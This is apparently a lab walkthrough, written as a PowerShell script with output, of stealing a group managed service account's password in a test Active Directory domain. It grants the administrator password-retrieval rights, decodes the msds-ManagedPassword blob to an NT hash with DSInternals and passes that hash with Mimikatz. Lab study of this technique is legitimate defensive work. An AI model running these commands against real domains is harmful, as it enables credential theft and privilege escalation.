
Get-ADServiceAccount -Identity GMSA_AD_CYLONS -Properties memberof
<#
    DistinguishedName : CN=GMSA_AD_CYLONS,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled           : True
    MemberOf          : {CN=GMSA_CYLON_USERS,OU=GMSAs,OU=itFlee,DC=WidgetLLC,DC=Internal}
    Name              : GMSA_AD_CYLONS
    ObjectClass       : msDS-GroupManagedServiceAccount
    ObjectGUID        : e036a9a8-2385-4f33-b818-819a255196cc
    SamAccountName    : GMSA_AD_CYLONS$
    SID               : S-1-5-21-2778787315-2228761457-209862467-8609
    UserPrincipalName :
#>


# View who the active user is
whoami
# widgetllc\administrator

# Then user a created script 'Get-ServiceLogonAccounts.ps1'
# This will gather the privileges on the target Managed Service Account, for all system users/accounts.
<#
Managed Service Account:
CN=GMSA_AD_CYLONS,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal

GMSA_AD_CYLONS IdentityReference                                      ActiveDirectoryRights
-------------- -----------------                                      ---------------------
               NT AUTHORITY\Authenticated Users                        GenericRead
               NT AUTHORITY\SYSTEM                                     GenericAll
               BUILTIN\Account Operators                               GenericAll
               WIDGETLLC\Domain Admins                                 GenericAll
               Everyone                                                ReadProperty
               NT AUTHORITY\SELF                                       ReadProperty, WriteProperty
               NT AUTHORITY\SELF                                       Self
               NT AUTHORITY\SELF                                       Self
               BUILTIN\Windows Authorization Access Group              ReadProperty
               WIDGETLLC\Domain Admins                                 WriteProperty
               WIDGETLLC\Domain Admins                                 WriteProperty
               WIDGETLLC\Domain Admins                                 Self
               WIDGETLLC\Domain Admins                                 Self
               WIDGETLLC\Domain Admins                                 WriteProperty
               ...
               ...
               WIDGETLLC\Enterprise Admins                             GenericAll
               BUILTIN\Pre-Windows 2000 Compatible Access              ListChildren
               BUILTIN\Administrators                     ... ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner           
#>



# Supposedly can see the 'msds-ManagedPassword' attribute, but not working
Set-Location AD:
$pwd = Get-ADServiceAccount -Identity GMSA_AD_CYLONS -Properties msds-ManagedPassword
$pwd
<#
    DistinguishedName : CN=GMSA_AD_CYLONS,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled           : True
    Name              : GMSA_AD_CYLONS
    ObjectClass       : msDS-GroupManagedServiceAccount
    ObjectGUID        : e036a9a8-2385-4f33-b818-819a255196cc
    SamAccountName    : GMSA_AD_CYLONS$
    SID               : S-1-5-21-2778787315-2228761457-209862467-8609
    UserPrincipalName : 
#>

# Since we know that the Administrator has 'GenericAll' i.e. full control of the MSA 'GMSA_AD_CYLONS', 
#   we can then modify the attributes and access which allow us to retrieve the password for the MSA
#    
Set-ADServiceAccount -Identity GMSA_AD_CYLONS `
-PrincipalsAllowedToRetrieveManagedPassword 'Administrator'

# View who can retrieve the password for this target gMSA
Get-ADServiceAccount -Identity GMSA_AD_CYLONS `
-Properties PrincipalsAllowedToRetrieveManagedPassword
<#
    DistinguishedName                          : CN=GMSA_AD_CYLONS,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled                                    : True
    Name                                       : GMSA_AD_CYLONS
    ObjectClass                                : msDS-GroupManagedServiceAccount
    ObjectGUID                                 : e036a9a8-2385-4f33-b818-819a255196cc
    PrincipalsAllowedToRetrieveManagedPassword : {CN=Administrator,CN=Users,DC=WidgetLLC,DC=Internal}
    SamAccountName                             : GMSA_AD_CYLONS$
    SID                                        : S-1-5-21-2778787315-2228761457-209862467-8609
    UserPrincipalName                          : 

#>

# Now view the options on 'who' can retrieve the gMSA password
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword
<#
    DistinguishedName                          : CN=GMSA_AD_CYLONS,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled                                    : True
    Name                                       : GMSA_AD_CYLONS
    ObjectClass                                : msDS-GroupManagedServiceAccount
    ObjectGUID                                 : e036a9a8-2385-4f33-b818-819a255196cc
    PrincipalsAllowedToRetrieveManagedPassword : {CN=Administrator,CN=Users,DC=WidgetLLC,DC=Internal}
    SamAccountName                             : GMSA_AD_CYLONS$
    SID                                        : S-1-5-21-2778787315-2228761457-209862467-8609
    UserPrincipalName                          : 

    DistinguishedName                          : CN=gMSAtest,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled                                    : True
    Name                                       : gMSAtest
    ObjectClass                                : msDS-GroupManagedServiceAccount
    ObjectGUID                                 : 2535e160-fb9b-4408-ad71-810605474374
    PrincipalsAllowedToRetrieveManagedPassword : {CN=gMSA-test,OU=SecurityGroups,DC=WidgetLLC,DC=Internal}
    SamAccountName                             : gMSAtest$
    SID                                        : S-1-5-21-2778787315-2228761457-209862467-8613
    UserPrincipalName                          : 

    DistinguishedName                          : CN=GMSA_AD_Agency,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled                                    : True
    Name                                       : GMSA_AD_Agency
    ObjectClass                                : msDS-GroupManagedServiceAccount
    ObjectGUID                                 : d86b51be-fb0f-4c2d-ae88-b98aeeaec586
    PrincipalsAllowedToRetrieveManagedPassword : {CN=DC01,OU=Domain Controllers,DC=WidgetLLC,DC=Internal, 
                                                 CN=CLIENT111,CN=Computers,DC=WidgetLLC,DC=Internal}
    SamAccountName                             : GMSA_AD_Agency$
    SID                                        : S-1-5-21-2778787315-2228761457-209862467-8615
    UserPrincipalName                          : 

    DistinguishedName                          : CN=TestMSA,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled                                    : True
    Name                                       : TestMSA
    ObjectClass                                : msDS-GroupManagedServiceAccount
    ObjectGUID                                 : 850ad035-f87e-4846-b6bf-403235381858
    PrincipalsAllowedToRetrieveManagedPassword : {CN=CLIENT111,CN=Computers,DC=WidgetLLC,DC=Internal}
    SamAccountName                             : TestMSA$
    SID                                        : S-1-5-21-2778787315-2228761457-209862467-8625
    UserPrincipalName                          : 

    DistinguishedName                          : CN=TestMSA123,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled                                    : True
    Name                                       : TestMSA123
    ObjectClass                                : msDS-GroupManagedServiceAccount
    ObjectGUID                                 : 0b075106-6a46-4f63-98d0-f36a6483eea4
    PrincipalsAllowedToRetrieveManagedPassword : {}
    SamAccountName                             : TestMSA123$
    SID                                        : S-1-5-21-2778787315-2228761457-209862467-8626
    UserPrincipalName                          : 
#>

$pwd = Get-ADServiceAccount -Identity GMSA_AD_CYLONS -Properties msds-ManagedPassword, `
msds-ManagedPasswordID, `
msds-ManagedPasswordPreviousID, `
msds-GroupMSAMembership, `
msds-ManagedPasswordInterval
$pwd

<#
    DistinguishedName              : CN=GMSA_AD_CYLONS,CN=Managed Service Accounts,DC=WidgetLLC,DC=Internal
    Enabled                        : True
    msds-GroupMSAMembership        : System.DirectoryServices.ActiveDirectorySecurity
    msds-ManagedPassword           : {1, 0, 0, 0...}
    msds-ManagedPasswordID         : {1, 0, 0, 0...}
    msds-ManagedPasswordInterval   : 30
    msds-ManagedPasswordPreviousID : {1, 0, 0, 0...}
    Name                           : GMSA_AD_CYLONS
    ObjectClass                    : msDS-GroupManagedServiceAccount
    ObjectGUID                     : e036a9a8-2385-4f33-b818-819a255196cc
    SamAccountName                 : GMSA_AD_CYLONS$
    SID                            : S-1-5-21-2778787315-2228761457-209862467-8609
    UserPrincipalName              : 
#>


$pwd.'msds-ManagedPassword'
<#
1
0
0
0
36
2
0
0
16
0
18
1
20
2
28
2
50
24
35
51
238
224
109
79
223
37
136
70
109
249
111
199
18
83
168
88
149
25
170
148
247
173
227
25
117
204
227
157
184
91
148
151
51
28
134
240
139
81
21
193
222
62
253
19
180
62
172
53
77
217
68
105
128
8
141
1
32
116
150
172
232
120
209
152
44
226
166
183
65
228
241
148
211
124
72
209
1
68
48
101
119
53
124
52
172
211
211
111
239
127
141
135
71
99
100
159
146
70
252
100
74
157
24
39
220
80
2
171
70
87
128
39
45
87
252
42
218
247
28
68
93
90
201
203
68
246
83
57
97
187
69
215
120
148
62
153
254
249
150
150
219
232
254
105
0
86
149
200
248
156
35
208
55
71
150
54
51
176
254
102
235
208
207
95
65
153
48
10
196
141
184
10
137
52
185
214
163
147
245
202
79
146
51
186
192
144
101
147
221
84
179
112
108
218
133
207
144
165
148
108
5
0
34
22
201
246
51
6
160
142
192
169
67
37
46
37
96
101
98
143
111
180
193
31
204
241
235
116
153
75
15
118
218
99
22
200
14
143
114
205
64
3
15
57
6
125
176
228
130
42
146
176
0
0
146
116
227
0
199
159
22
26
177
246
184
39
192
33
1
83
51
225
96
249
202
145
104
26
202
237
231
234
63
225
129
217
116
193
163
247
141
254
160
145
156
15
24
120
107
150
21
167
51
82
82
1
21
64
30
159
113
205
64
236
7
75
217
112
252
120
77
199
183
163
238
122
131
52
43
246
116
217
78
125
175
250
166
18
50
75
69
168
42
55
152
147
147
237
189
196
115
53
224
87
82
240
17
44
92
80
252
238
136
104
224
141
228
244
126
49
52
0
33
10
129
124
13
19
173
132
177
34
225
140
192
143
203
104
22
152
71
40
1
65
89
217
173
1
7
163
24
43
158
162
159
242
65
71
117
212
90
22
17
4
131
20
160
202
120
49
111
228
109
43
108
191
85
31
252
13
140
245
30
58
109
199
12
145
160
56
180
219
84
204
203
101
149
105
23
170
197
126
146
247
165
115
96
216
113
218
73
10
54
128
42
1
98
238
93
51
179
218
1
113
228
38
54
244
83
117
132
248
203
254
240
106
207
74
184
0
221
21
187
236
234
224
28
103
45
241
231
48
93
147
241
30
159
45
118
188
0
0
25
89
177
6
160
18
0
0
25
251
224
83
159
18
0
0
#>

# There is a external PowerShell tool 'DSInternals' (needed for the commands below)

$pw = ConvertFrom-ADManagedPasswordBlob $pwd.'msds-ManagedPassword' 

ConvertTo-NTHash $pw.securecurrentpassword 
#Resulting HASH:    a99afa608b79a3c539a969212c505ea9

# We would now have a result such as "a99afa608b79a3c539a969212c505ea9"
# We could then use MimiKatz, which is an open-source applicaiton that allows users to view and
#    save authentication credentials like Kerboeros tickets.
# We could pass the hash: 

#PS MimiKatz # 
> sekurlsa::pth /user:GMSA_AD_CYLONS /domain:widgetllc.internal /ntlm:a99afa608b79a3c539a969212c505ea9

# If all is correct, this is were it would be possible to exploit privileges.
# This would open a shell, which would be run as the gMSA service account that was targeted,
#     and was a member of the Domain Administrators 

